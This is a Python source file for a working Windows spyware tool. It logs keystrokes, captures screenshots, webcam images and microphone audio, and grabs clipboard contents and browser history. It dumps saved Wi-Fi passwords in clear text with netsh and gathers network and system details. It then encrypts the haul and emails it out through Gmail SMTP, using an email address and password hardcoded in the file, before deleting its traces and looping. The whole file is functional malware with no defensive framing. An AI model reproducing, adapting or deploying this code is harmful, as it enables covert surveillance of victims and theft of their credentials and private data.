import subprocess                                   # Used to run new applications
import socket                                       # Used to write to Internet servers
import win32clipboard                               # System grabs the most recent clipboard data and saves it to a file
import os                                           # Provides functions for interacting with the operating system
import re                                           # Helps you match or find other strings or sets of strings
import smtplib                                      # Defines an SMTP client session object
import logging                                      # Allows writing status messages to a file or any other output streams
import pathlib                                      # Deals with path related tasks
import json                                         
import time                                         # Waiting during code execution & measuring the efficiency of your code.
import cv2                                          # Image processing, video capture
import sounddevice                                  # Play and record NumPy arrays containing audio signals
import shutil                                       # Automating process of copying and removal of files and directories
import requests                                     # Send HTTP/1.1 requests using Python
import browserhistory as bh                         # To get browser username, database paths, and history in JSON format
from multiprocessing import Process                 # supports spawning processes
from pynput.keyboard import Key, Listener           # Monitor input devices
from PIL import ImageGrab                           # Copy the contents of the screen or the clipboard to a PIL image memory
from scipy.io.wavfile import write as write_rec     # Write a NumPy array as a WAV file
from cryptography.fernet import Fernet              # Message encrypted using it cannot be manipulated or read without the key
from email.mime.multipart import MIMEMultipart      # Encodes ['From'], ['To'], and ['Subject']
from email.mime.text import MIMEText                # Sending text emails
from email.mime.base import MIMEBase                # Adds a Content-Type header
from email import encoders

################ Configuration: Base Path and Default Settings ################

# Get Windows username for dynamic path creation
WINDOWS_USERNAME = os.getenv('USERNAME')
BASE_LOG_PATH = pathlib.Path(f'C:\\Users\\{WINDOWS_USERNAME}\\AppData\\Local\\Temp\\Logs\\')
# Fallback to Temp folder if above path fails
if not BASE_LOG_PATH.parent.exists():
    BASE_LOG_PATH = pathlib.Path(f'C:\\Users\\{WINDOWS_USERNAME}\\AppData\\Local\\Temp\\Logs\\')

################ Functions: Keystorke Capture, Screenshot Capture, Mic Recroding, Webcam Snapshot, Email Sending ################

# Keystroke Capture Funtion
def logg_keys(file_path):
    try:
        log_file = os.path.join(file_path, 'key_logs.txt')
        logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
        on_press = lambda Key : logging.info(str(Key))  # Log the Pressed Keys
        with Listener(on_press=on_press) as listener:   # Collect events until released
            listener.join()
    except Exception as e:
        logging.error(f'Keystroke logging error: {e}')

# Loop that records the microphone for 60 second intervals
def screenshot(file_path):
    try:
        screenshots_path = os.path.join(file_path, 'Screenshots')
        pathlib.Path(screenshots_path).mkdir(parents=True, exist_ok=True)

        for x in range(0, 10):
            try:
                pic = ImageGrab.grab()
                pic.save(os.path.join(screenshots_path, f'screenshot{x}.png'))
                time.sleep(5)                               # Gap between the each screenshot in sec
            except Exception as e:
                logging.error(f'Screenshot {x} failed: {e}')
    except Exception as e:
        logging.error(f'Screenshot function error: {e}')

# Loop that save a picture every 5 seconds
def microphone(file_path):
    try:
        for x in range(0, 5):
            try:
                fs = 44100
                seconds = 10
                myrecording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
                sounddevice.wait()                          # To check if the recording is finished
                write_rec(os.path.join(file_path, f'{x}_mic_recording.wav'), fs, myrecording)
            except Exception as e:
                logging.error(f'Microphone recording {x} failed: {e}')
    except Exception as e:
        logging.error(f'Microphone function error: {e}')

# Webcam Snapshot Function #
def webcam(file_path):
    try:
        webcam_path = os.path.join(file_path, 'WebcamPics')
        pathlib.Path(webcam_path).mkdir(parents=True, exist_ok=True)
        cam = cv2.VideoCapture(0)

        if not cam.isOpened():
            logging.error('Webcam could not be opened')
            return

        for x in range(0, 10):
            try:
                ret, img = cam.read()
                if ret:
                    file = os.path.join(webcam_path, f'{x}.jpg')
                    cv2.imwrite(file, img)
                    time.sleep(5)
                else:
                    logging.error(f'Failed to capture webcam frame {x}')
            except Exception as e:
                logging.error(f'Webcam capture {x} failed: {e}')

        cam.release()
        cv2.destroyAllWindows()
    except Exception as e:
        logging.error(f'Webcam function error: {e}')

def email_base(name, email_address):
    name['From'] = email_address
    name['To'] =  email_address
    name['Subject'] = 'Success!!!'
    body = 'Mission is completed'
    name.attach(MIMEText(body, 'plain'))
    return name

def smtp_handler(email_address, password, name):
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(email_address, password)
    s.sendmail(email_address, email_address, name.as_string())
    s.quit()

def send_email(path):                               # Email sending function #
    try:
        regex = re.compile(r'.+\.xml$')
        regex2 = re.compile(r'.+\.txt$')
        regex3 = re.compile(r'.+\.png$')
        regex4 = re.compile(r'.+\.jpg$')
        regex5 = re.compile(r'.+\.wav$')

        email_address = 'tmeytmong@gmail.com'         #<--- Enter your email address
        password = 'Viroth@973'                       #<--- Enter email password 
        
        msg = MIMEMultipart()
        email_base(msg, email_address)

        exclude = set(['Screenshots', 'WebcamPics'])
        for dirpath, dirnames, filenames in os.walk(path, topdown=True):
            dirnames[:] = [d for d in dirnames if d not in exclude]
            for file in filenames:
                # For each file in the filenames in the specified path, it will try to match the file extension to one of the regex variables.
                # If one of the first four regex variables match, then all of files of that data type will be attached to a single email message.
                if regex.match(file) or regex2.match(file) or regex3.match(file) or regex4.match(file):
                    try:
                        p = MIMEBase('application', "octet-stream")
                        file_path = os.path.join(dirpath, file)
                        with open(file_path, 'rb') as attachment:
                            p.set_payload(attachment.read())
                        encoders.encode_base64(p)
                        p.add_header('Content-Disposition', 'attachment;' f'filename = {file}')
                        msg.attach(p)
                    except Exception as e:
                        logging.error(f'Failed to attach file {file}: {e}')

                # If regex5(WAV) variable matches, then that single match will be attached to its own individual email and sent.
                elif regex5.match(file):
                    try:
                        msg_alt = MIMEMultipart()
                        email_base(msg_alt, email_address)
                        p = MIMEBase('application', "octet-stream")
                        file_path = os.path.join(dirpath, file)
                        with open(file_path, 'rb') as attachment:
                            p.set_payload(attachment.read())
                        encoders.encode_base64(p)
                        p.add_header('Content-Disposition', 'attachment;' f'filename = {file}')
                        msg_alt.attach(p)

                        smtp_handler(email_address, password, msg_alt)
                    except Exception as e:
                        logging.error(f'Failed to send WAV file {file}: {e}')

                # If there are no matches then pass is called to keep the program moving.
                else:
                    pass

        # To send any of the non WAV files
        smtp_handler(email_address, password, msg)
    except Exception as e:
        logging.error(f'Email sending function error: {e}')


######################### Main Function: Network/Wifi Info, System Info, Clipbaord Data, Browser History #########################

# Once main is initiated the program begins by creating a directory to store the data it will gather.
def main():
    try:
        # Create logs directory dynamically
        file_path = str(BASE_LOG_PATH)
        pathlib.Path(file_path).mkdir(parents=True, exist_ok=True)

        # Retrieve Network/Wifi informaton for the network_wifi file
        network_wifi_path = os.path.join(file_path, 'network_wifi.txt')
        with open(network_wifi_path, 'a') as network_wifi:
            try:
                # Using the subprocess module a shell executes the specified commands with the standard output and error directed to the log file.
                log_path = file_path
                commands = subprocess.Popen([ 'Netsh', 'WLAN', 'export', 'profile', f'folder={log_path}', 'key=clear', 
                                            '&', 'ipconfig', '/all', '&', 'arp', '-a', '&', 'getmac', '-V', '&', 'route', 'print', '&',
                                            'netstat', '-a'], stdout=network_wifi, stderr=network_wifi, shell=True)
                # The communicate funtion is used to initiate a 60 second timeout for the shell.
                outs, errs = commands.communicate(timeout=60)   

            except subprocess.TimeoutExpired:
                commands.kill()
                out, errs = commands.communicate()
            except Exception as e:
                logging.error(f'Network/Wifi command error: {e}')

        # Retrieve system information for the system_info file
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

        system_info_path = os.path.join(file_path, 'system_info.txt')
        with open(system_info_path, 'a') as system_info:
            try:
                public_ip = requests.get('https://api.ipify.org', timeout=5).text
            except (requests.ConnectionError, requests.Timeout):
                public_ip = '* Ipify connection failed *'

            system_info.write('Public IP Address: ' + public_ip + '\n' + 'Private IP Address: ' + IPAddr + '\n')
            try:
                get_sysinfo = subprocess.Popen(['systeminfo', '&', 'tasklist', '&', 'sc', 'query'], 
                                stdout=system_info, stderr=system_info, shell=True)
                outs, errs = get_sysinfo.communicate(timeout=15)

            except subprocess.TimeoutExpired:
                get_sysinfo.kill()
                outs, errs = get_sysinfo.communicate()
            except Exception as e:
                logging.error(f'System info command error: {e}')

        # Grabs the most recent clipboard data and saves it to a file
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
            win32clipboard.CloseClipboard()
            
            clipboard_path = os.path.join(file_path, 'clipboard_info.txt')
            with open(clipboard_path, 'a') as clipboard_info:
                clipboard_info.write('Clipboard Data: \n' + pasted_data)
        except Exception as e:
            logging.error(f'Clipboard capture error: {e}')

        # Get the browser username, database paths, and history in JSON format
        try:
            browser_history = []
            bh_user = bh.get_username()
            db_path = bh.get_database_paths()
            hist = bh.get_browserhistory()
            browser_history.extend((bh_user, db_path, hist))
            
            browser_path = os.path.join(file_path, 'browser.txt')
            with open(browser_path, 'a') as browser_txt:
                browser_txt.write(json.dumps(browser_history))
        except Exception as e:
            logging.error(f'Browser history error: {e}')


################################################### Using Multiprocess module ###################################################

        p1 = Process(target=logg_keys, args=(file_path,)) ; p1.start()  # Log Keys
        p2 = Process(target=screenshot, args=(file_path,)) ; p2.start() # Take Screenshots
        p3 = Process(target=microphone, args=(file_path,)) ; p3.start() # Record Microphone
        p4 = Process(target=webcam, args=(file_path,)) ; p4.start()     # Take Webcam Pictures

        # To stop execution of current program until a process is complete
        p1.join(timeout=300) ; p2.join(timeout=300) ; p3.join(timeout=300) ; p4.join(timeout=300)
        p1.terminate() ; p2.terminate() ; p3.terminate() ; p4.terminate()


######################################################## File Encryption ########################################################

        files = [ 'network_wifi.txt', 'system_info.txt', 'clipboard_info.txt', 'browser.txt', 'key_logs.txt' ]

        regex = re.compile(r'.+\.xml$')
        dir_path = file_path

        for dirpath, dirnames, filenames in os.walk(dir_path):
            [ files.append(file) for file in filenames if regex.match(file) ]

        
        # To generate a key: Do the Following in the Python Console->
        # from cryptography.fernet import Fernet
        # Fernet.generate_key()
        
        key = b'MujBTqtZ4QCQW_fmlMHVWBmTVRW8IGZSuxFctu_D3d0='

        for file in files:
            try:
                file_full_path = os.path.join(file_path, file)
                if os.path.exists(file_full_path):
                    with open(file_full_path, 'rb') as plain_text:            # Opens the file in binary format for reading
                        data = plain_text.read()
                    encrypted = Fernet(key).encrypt(data)
                    encrypted_file_path = os.path.join(file_path, 'e_' + file)
                    with open(encrypted_file_path, 'ab') as hidden_data:    # Appending to the end of the file if it exists
                        hidden_data.write(encrypted)
                    os.remove(file_full_path)
            except Exception as e:
                logging.error(f'Encryption error for file {file}: {e}')

        # Send encrypted files to email account
        try:
            send_email(file_path)
            screenshots_dir = os.path.join(file_path, 'Screenshots')
            if os.path.exists(screenshots_dir):
                send_email(screenshots_dir)
            
            webcam_dir = os.path.join(file_path, 'WebcamPics')
            if os.path.exists(webcam_dir):
                send_email(webcam_dir)
        except Exception as e:
            logging.error(f'Email sending error: {e}')

        # Clean Up Files
        try:
            shutil.rmtree(file_path)
        except Exception as e:
            logging.error(f'Cleanup error: {e}')

        main()  # Loop

    except Exception as e:
        logging.basicConfig(level=logging.DEBUG, filename=os.path.join(str(BASE_LOG_PATH), 'error_log.txt'))
        logging.exception(f'* Error Occurred in main: {e} *')


# When an error occurs a detailed full stack trace can be logged to a file for an admin;
# while the user receives a much more vague message preventing information leakage.

if __name__ == '__main__':
    try:
        main()

    except KeyboardInterrupt:
        print('* Control-C entered...Program exiting *')

    except Exception as ex:
        error_log_path = os.path.join(str(BASE_LOG_PATH), 'error_log.txt')
        logging.basicConfig(level=logging.DEBUG, filename=error_log_path)
        logging.exception(f'* Error Occurred: {ex} *')
        print(f'An error occurred. Check logs at: {error_log_path}')